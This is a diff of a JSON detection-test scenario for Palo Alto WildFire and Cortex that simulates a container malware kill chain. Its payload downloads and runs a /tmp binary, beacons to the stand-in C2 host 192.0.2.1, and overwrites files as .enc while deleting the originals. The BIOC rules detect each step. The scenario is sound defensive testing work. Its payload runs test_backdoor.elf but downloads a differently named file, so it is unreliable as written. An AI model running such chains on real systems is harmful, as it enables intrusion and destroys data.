@@ -47,9 +47,9 @@
     }
   },
   "identity": {
-    "name": "WildFire Malware Trigger \u2014 Dropped Backdoor, C2 Beacon, Ransomware Sim (T1105)",
-    "summary": "A compromised container downloads a WildFire test/known-bad ELF, executes the dropped binary from /tmp under a service identity, beacons to a C2 test endpoint on a fixed interval, then performs ransomware-style bulk file rename to .enc. WildFire returns a malicious verdict on the dropped file while Cortex Cloud runtime defense and XDR container BIOCs flag the download-then-execute chain, the pe\u2026",
-    "description": "WildFire is Palo Alto Networks' cloud-delivered malware-analysis engine: it detonates unknown files and returns verdicts that propagate to the NGFW, XDR, and Cortex Cloud. This scenario validates the full WildFire-anchored kill chain inside a container without using live malware \u2014 it fetches the WildFire public ELF test file (and synthesizes a deterministic known-bad ELF), executes the dropped binary from /tmp under the www-data identity, issues three timed HTTP beacons to a TEST-NET-1 (192.0.2.0/24) C2 endpoint with a spoofed user-agent, and runs a safe XOR-based bulk rename of staged files to .enc to mimic ransomware impact. The detection approach combines WildFire's file verdict with container-context behavioral analysis: Cortex flags the executable download-and-chmod pattern, the execution of a downloaded /tmp binary by a service account, the regular periodic outbound HTTP beacon, and the post-execution mass .enc rename. A correlation rule fuses the download, execution, beacon, and encryption stages from one container into a single high-severity malware incident, demonstrating WildFire + runtime + XSIAM stitching.",
+    "name": "WildFire Malware Trigger — Dropped Backdoor, C2 Beacon, Ransomware Sim (T1105)",
+    "summary": "A compromised container downloads a WildFire test/known-bad ELF, executes the dropped binary from /tmp under a service identity, beacons to a C2 test endpoint on a fixed interval, then performs ransomware-style bulk file rename to .enc. WildFire returns a malicious verdict on the dropped file while Cortex Cloud runtime defense and XDR container BIOCs flag the download-then-execute chain, the pe…",
+    "description": "WildFire is Palo Alto Networks' cloud-delivered malware-analysis engine: it detonates unknown files and returns verdicts that propagate to the NGFW, XDR, and Cortex Cloud. This scenario validates the full WildFire-anchored kill chain inside a container without using live malware — it fetches the WildFire public ELF test file (and synthesizes a deterministic known-bad ELF), executes the dropped binary from /tmp under the www-data identity, issues three timed HTTP beacons to a TEST-NET-1 (192.0.2.0/24) C2 endpoint with a spoofed user-agent, and runs a safe XOR-based bulk rename of staged files to .enc to mimic ransomware impact. The detection approach combines WildFire's file verdict with container-context behavioral analysis: Cortex flags the executable download-and-chmod pattern, the execution of a downloaded /tmp binary by a service account, the regular periodic outbound HTTP beacon, and the post-execution mass .enc rename. A correlation rule fuses the download, execution, beacon, and encryption stages from one container into a single high-severity malware incident, demonstrating WildFire + runtime + XSIAM stitching.",
     "severity": "high",
     "confidence": "high"
   },
@@ -119,7 +119,7 @@
   "execution": {
     "target_platform": "linux",
     "execution_framework": "atomic-red-team",
-    "framework_reference_id": "T1105 \u2014 WildFire test-file download, dropped-binary execution, C2 beacon, and ransomware-style bulk rename inside a container.",
+    "framework_reference_id": "T1105 — WildFire test-file download, dropped-binary execution, C2 beacon, and ransomware-style bulk rename inside a container.",
     "privilege_required": "user",
     "prerequisites": [
       {
@@ -127,12 +127,12 @@
         "check_command": "systemctl is-active cortex-agent || ps aux | grep -i defender"
       },
       {
-        "description": "Lab environment matching scenario SIM-CDR-005 \u2014 container with curl/python3 available and outbound egress to the WildFire test endpoint (lab only). C2 target is TEST-NET-1 (192.0.2.0/24)."
+        "description": "Lab environment matching scenario SIM-CDR-005 — container with curl/python3 available and outbound egress to the WildFire test endpoint (lab only). C2 target is TEST-NET-1 (192.0.2.0/24)."
       }
     ],
     "payload": {
       "interpreter": "bash",
-      "code": "# WildFire-anchored malware kill chain \u2014 synthetic ELF + TEST-NET C2, safe XOR rename (no real encryption).\nmkdir -p /tmp/wf_sim && curl -sSL https://wildfire.paloaltonetworks.com/publicapi/test/elf -o /tmp/wf_sim/wildfire_test.elf; chmod +x /tmp/wf_sim/test_backdoor.elf 2>/dev/null\ntimeout 5 /tmp/wf_sim/test_backdoor.elf 2>/dev/null\nfor i in 1 2 3; do curl -sSA 'Mozilla/5.0 (compatible; MSIE 9.0)' --connect-timeout 3 \"http://192.0.2.1/beacon?id=SIM-CDR-005&seq=${i}\" 2>/dev/null; sleep 2; done\n# safe XOR rename to .enc \u2014 CortexSim safety: not real ransomware\npython3 -c \"import os,base64;d='/tmp/wf_sim/targets';[open(os.path.join(d,f)+'.enc','wb').write(base64.b64encode(bytes(b^0xAA for b in open(os.path.join(d,f),'rb').read()))) or os.remove(os.path.join(d,f)) for f in os.listdir(d)]\"",
+      "code": "# WildFire-anchored malware kill chain — synthetic ELF + TEST-NET C2, safe XOR rename (no real encryption).\nmkdir -p /tmp/wf_sim && curl -sSL https://wildfire.paloaltonetworks.com/publicapi/test/elf -o /tmp/wf_sim/wildfire_test.elf; chmod +x /tmp/wf_sim/test_backdoor.elf 2>/dev/null\ntimeout 5 /tmp/wf_sim/test_backdoor.elf 2>/dev/null\nfor i in 1 2 3; do curl -sSA 'Mozilla/5.0 (compatible; MSIE 9.0)' --connect-timeout 3 \"http://192.0.2.1/beacon?id=SIM-CDR-005&seq=${i}\" 2>/dev/null; sleep 2; done\n# safe XOR rename to .enc — CortexSim safety: not real ransomware\npython3 -c \"import os,base64;d='/tmp/wf_sim/targets';[open(os.path.join(d,f)+'.enc','wb').write(base64.b64encode(bytes(b^0xAA for b in open(os.path.join(d,f),'rb').read()))) or os.remove(os.path.join(d,f)) for f in os.listdir(d)]\"",
       "input_variables": [],
       "timeout_seconds": 120
     },
@@ -168,7 +168,7 @@
       {
         "ioc_type": "ipv4",
         "value": "192.0.2.1",
-        "context": "TEST-NET-1 C2 beacon endpoint used by the simulation \u2014 stands in for a malware callback host.",
+        "context": "TEST-NET-1 C2 beacon endpoint used by the simulation — stands in for a malware callback host.",
         "reputation_required": "any"
       },
       {
@@ -181,7 +181,7 @@
     "biocs": [
       {
         "name": "CDR-005 WildFire Known Bad ELF Download In Container",
-        "description": "WildFire test file download in container \u2014 known-bad file signature matched by WildFire cloud intelligence. A container process downloads an ELF that WildFire verdicts as malicious.",
+        "description": "WildFire test file download in container — known-bad file signature matched by WildFire cloud intelligence. A container process downloads an ELF that WildFire verdicts as malicious.",
         "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS\n| filter event_sub_type = ENUM.PROCESS_START\n| filter container_id != null\n| filter actor_process_image_name in (\"curl\", \"wget\")\n| filter action_process_image_command_line contains_any (\".elf\", \"wildfire.paloaltonetworks.com\", \"publicapi/test\")",
         "severity": "high",
         "mitre_technique_ids": [
@@ -190,7 +190,7 @@
       },
       {
         "name": "CDR-005 Executable Downloaded To Tmp And Made Executable In Container",
-        "description": "Executable file downloaded to /tmp and made executable \u2014 download-then-execute pattern in container. A binary lands in /tmp and is immediately chmod +x within the same container lineage.",
+        "description": "Executable file downloaded to /tmp and made executable — download-then-execute pattern in container. A binary lands in /tmp and is immediately chmod +x within the same container lineage.",
         "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS\n| filter event_sub_type = ENUM.PROCESS_START\n| filter container_id != null\n| filter actor_process_image_name = \"chmod\"\n| filter action_process_image_command_line contains \"/tmp/\"\n| filter action_process_image_command_line contains_any (\"+x\", \"0755\", \"755\")",
         "severity": "medium",
         "mitre_technique_ids": [
@@ -199,8 +199,8 @@
       },
       {
         "name": "CDR-005 WildFire ELF Execution In Container",
-        "description": "WildFire test file execution \u2014 malicious ELF execution in container triggers CDR BIOC rule. The downloaded ELF binary is executed from /tmp inside the container.",
-        "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS\n| filter event_sub_type = ENUM.PROCESS_START\n| filter container_id != null\n| filter actor_process_image_path contains \"/tmp/\"\n| filter actor_process_image_path contains_any (\".elf\", \"test_backdoor\", \"wf_sim\")",
+        "description": "WildFire test file execution — malicious ELF execution in container triggers CDR BIOC rule. The downloaded ELF binary is executed from /tmp inside the container.",
+        "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS\n| filter event_sub_type = ENUM.PROCESS_START\n| filter container_id != null\n| filter causality_actor_process_image_name in (\"apache2\", \"nginx\", \"bash\", \"sh\", \"test_backdoor.elf\")\n| filter actor_process_image_path contains \"/tmp/\"\n| filter actor_process_image_path contains_any (\".elf\", \"test_backdoor\", \"wf_sim\")",
         "severity": "high",
         "mitre_technique_ids": [
           "T1059.004"
@@ -208,8 +208,8 @@
       },
       {
         "name": "CDR-005 Downloaded Binary Executed By Service Account In Container",
-        "description": "Downloaded binary executed from /tmp by www-data context \u2014 high-risk execution chain in container. A service identity executes a binary that originated from a download into /tmp.",
-        "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS\n| filter event_sub_type = ENUM.PROCESS_START\n| filter container_id != null\n| filter actor_process_image_path contains \"/tmp/\"\n| filter actor_effective_username in (\"www-data\", \"nobody\", \"node\", \"apache\", \"nginx\")",
+        "description": "Downloaded binary executed from /tmp by www-data context — high-risk execution chain in container. A service identity executes a binary that originated from a download into /tmp.",
+        "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS\n| filter event_sub_type = ENUM.PROCESS_START\n| filter container_id != null\n| filter causality_actor_process_image_name in (\"apache2\", \"nginx\", \"bash\", \"sh\")\n| filter actor_process_image_path contains \"/tmp/\"\n| filter actor_effective_username in (\"www-data\", \"nobody\", \"node\", \"apache\", \"nginx\")",
         "severity": "high",
         "mitre_technique_ids": [
           "T1059.004"
@@ -217,7 +217,7 @@
       },
       {
         "name": "CDR-005 Periodic Outbound HTTP Beacon From Container",
-        "description": "Regular periodic outbound HTTP connections from container \u2014 C2 beacon interval pattern (3 attempts to 192.0.2.1). A container process makes repeated timed HTTP requests to a single external host.",
+        "description": "Regular periodic outbound HTTP connections from container — C2 beacon interval pattern (3 attempts to 192.0.2.1). A container process makes repeated timed HTTP requests to a single external host.",
         "logic": "preset = xdr_data\n| filter event_type = ENUM.NETWORK\n| filter container_id != null\n| filter dst_action_external_hostname = \"192.0.2.1\" or action_remote_ip = \"192.0.2.1\"\n| filter dst_action_external_port = 80\n| comp count() as beacon_count by container_id, action_remote_ip\n| filter beacon_count >= 2",
         "severity": "high",
         "mitre_technique_ids": [
@@ -226,8 +226,8 @@
       },
       {
         "name": "CDR-005 Post Execution C2 Network Activity In Container",
-        "description": "C2 communication pattern following malware execution \u2014 post-execution network activity in container. Outbound network activity originates from a curl process spawned in the same container that executed the dropped binary.",
-        "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS\n| filter event_sub_type = ENUM.PROCESS_START\n| filter container_id != null\n| filter actor_process_image_name = \"curl\"\n| filter action_process_image_command_line contains \"192.0.2.1\"\n| filter action_process_image_command_line contains_any (\"beacon\", \"User-Agent\", \"-A \", \"MSIE\")",
+        "description": "C2 communication pattern following malware execution — post-execution network activity in container. Outbound network activity originates from a curl process spawned in the same container that executed the dropped binary.",
+        "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS\n| filter event_sub_type = ENUM.PROCESS_START\n| filter container_id != null\n| filter causality_actor_process_image_name in (\"apache2\", \"nginx\", \"bash\", \"sh\", \"test_backdoor.elf\")\n| filter actor_process_image_name = \"curl\"\n| filter action_process_image_command_line contains \"192.0.2.1\"\n| filter action_process_image_command_line contains_any (\"beacon\", \"User-Agent\", \"-A \", \"MSIE\")",
         "severity": "medium",
         "mitre_technique_ids": [
           "T1071.001"
@@ -235,7 +235,7 @@
       },
       {
         "name": "CDR-005 Mass File Modification Ransomware Pattern In Container",
-        "description": "Mass file modification pattern in container \u2014 ransomware-style encryption simulation matches T1486 behavioral rule. A burst of file writes/removes in a single directory mimics ransomware impact.",
+        "description": "Mass file modification pattern in container — ransomware-style encryption simulation matches T1486 behavioral rule. A burst of file writes/removes in a single directory mimics ransomware impact.",
         "logic": "preset = xdr_data\n| filter event_type = ENUM.FILE\n| filter container_id != null\n| filter event_sub_type in (ENUM.FILE_CREATE, ENUM.FILE_REMOVE, ENUM.FILE_RENAME)\n| comp count() as file_ops by container_id, causality_actor_process_instance_id\n| filter file_ops >= 5",
         "severity": "high",
         "mitre_technique_ids": [
@@ -244,7 +244,7 @@
       },
       {
         "name": "CDR-005 Bulk Enc Extension Rename After Execution In Container",
-        "description": "Bulk file rename with .enc extension following malware execution \u2014 post-execution encryption behavior in container. Multiple files acquire a .enc extension shortly after the dropped binary runs.",
+        "description": "Bulk file rename with .enc extension following malware execution — post-execution encryption behavior in container. Multiple files acquire a .enc extension shortly after the dropped binary runs.",
         "logic": "preset = xdr_data\n| filter event_type = ENUM.FILE\n| filter event_sub_type = ENUM.FILE_CREATE\n| filter container_id != null\n| filter action_file_extension = \"enc\"\n| comp count() as enc_files by container_id\n| filter enc_files >= 3",
         "severity": "high",
         "mitre_technique_ids": [
@@ -256,7 +256,7 @@
       {
         "purpose": "validation",
         "name": "CDR-005 Validate Dropped ELF Execution In Container",
-        "query": "preset = xdr_data\n| filter _time > to_timestamp(current_time() - 1800)\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter container_id != null\n| filter actor_process_image_path contains \"/tmp/\" and actor_process_image_path contains_any (\".elf\", \"wf_sim\", \"test_backdoor\")\n| fields _time, agent_hostname, container_id, actor_effective_username, actor_process_image_path, action_process_image_command_line",
+        "query": "preset = xdr_data\n| filter _time > to_timestamp(current_time() - 1800)\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter container_id != null\n| filter actor_process_image_path contains \"/tmp/\" and actor_process_image_path contains_any (\".elf\", \"wf_sim\", \"test_backdoor\")\n| fields _time, agent_hostname, container_id, causality_id, causality_actor_process_image_name, actor_process_instance_id, actor_effective_username, actor_process_image_path, action_process_image_command_line",
         "expected_rows_min": 1,
         "dataset": "xdr_data"
       },
@@ -277,15 +277,15 @@
     ],
     "correlation_rules": [
       {
-        "name": "WildFire Malware Kill Chain \u2014 Download Execute Beacon Encrypt",
+        "name": "WildFire Malware Kill Chain — Download Execute Beacon Encrypt",
         "rule_id": "CR-CDR-0005",
-        "logic": "BIOC(CDR-005 WildFire Known Bad ELF Download In Container) OR BIOC(CDR-005 WildFire ELF Execution In Container) OR BIOC(CDR-005 Downloaded Binary Executed By Service Account In Container) OR BIOC(CDR-005 Periodic Outbound HTTP Beacon From Container) OR BIOC(CDR-005 Post Execution C2 Network Activity In Container) OR BIOC(CDR-005 Mass File Modification Ransomware Pattern In Container) OR BIOC(CDR-005 Bulk Enc Extension Rename After Execution In Container)"
+        "logic": "BIOC(CDR-005 WildFire Known Bad ELF Download In Container) OR BIOC(CDR-005 WildFire ELF Execution In Container) OR BIOC(CDR-005 Downloaded Binary Executed By Service Account In Container) OR BIOC(CDR-005 Periodic Outbound HTTP Beacon From Container) OR BIOC(CDR-005 Post Execution C2 Network Activity In Container) OR BIOC(CDR-005 Mass File Modification Ransomware Pattern In Container) OR BIOC(CDR-005 Bulk Enc Extension Rename After Execution In Container) GROUPED BY container_id, causality_id WITHIN 300s"
       }
     ],
     "analytics_modules": [
-      "Advanced WildFire \u2014 Malicious file verdict on the dropped ELF",
-      "Cortex Cloud Runtime Defense \u2014 Dropped binary execution and post-execution C2 beacon",
-      "Cortex XDR Analytics \u2014 Download-execute-beacon-encrypt behavioral cluster in container"
+      "Advanced WildFire — Malicious file verdict on the dropped ELF",
+      "Cortex Cloud Runtime Defense — Dropped binary execution and post-execution C2 beacon",
+      "Cortex XDR Analytics — Download-execute-beacon-encrypt behavioral cluster in container"
     ]
   },
   "panw_mapping": {
@@ -334,14 +334,14 @@
         "evidence_query": "Correlation CR-CDR-0005 fuses the WildFire download, dropped-binary execution, C2 beacon, and mass .enc rename from one container into a single malware incident."
       }
     ],
-    "use_cases": [
+    "threat_scenarios": [
       {
-        "use_case_id": "UC-CLOUD-026",
-        "name": "WildFire Cloud Intelligence Validation \u2014 Malware Kill Chain",
-        "description": "Validate WildFire file verdicts and stitch the download \u2192 execute \u2192 beacon \u2192 encrypt malware chain inside a container.",
-        "test_cases": [
+        "threat_scenario_id": "TS-CLOUD-026",
+        "name": "WildFire Cloud Intelligence Validation — Malware Kill Chain",
+        "description": "Validate WildFire file verdicts and stitch the download → execute → beacon → encrypt malware chain inside a container.",
+        "threat_steps": [
           {
-            "test_case_id": "TC-CLOUD-026A",
+            "threat_step_id": "TS-CLOUD-026A",
             "objective": "WildFire verdicts the dropped ELF and the runtime BIOCs fire for execution and beacon.",
             "preconditions": [
               "Cortex Cloud runtime defender or Cortex XDR Linux agent >= 8.4.0 reporting on the node.",
@@ -359,7 +359,7 @@
             "expected_score_weight": 0.6
           },
           {
-            "test_case_id": "TC-CLOUD-026B",
+            "threat_step_id": "TS-CLOUD-026B",
             "objective": "Download/execute/beacon/encrypt stages stitch into one malware incident.",
             "success_criteria": [
               "Correlation `CR-CDR-0005` groups the stages from one container_id into one incident.",
@@ -394,7 +394,7 @@
       "primary": true
     },
     {
-      "title": "MITRE ATT&CK T1105 \u2014 Ingress Tool Transfer",
+      "title": "MITRE ATT&CK T1105 — Ingress Tool Transfer",
       "url": "https://attack.mitre.org/techniques/T1105/",
       "publisher": "MITRE",
       "publisher_id": "SRC-MITRE-ATTACK"
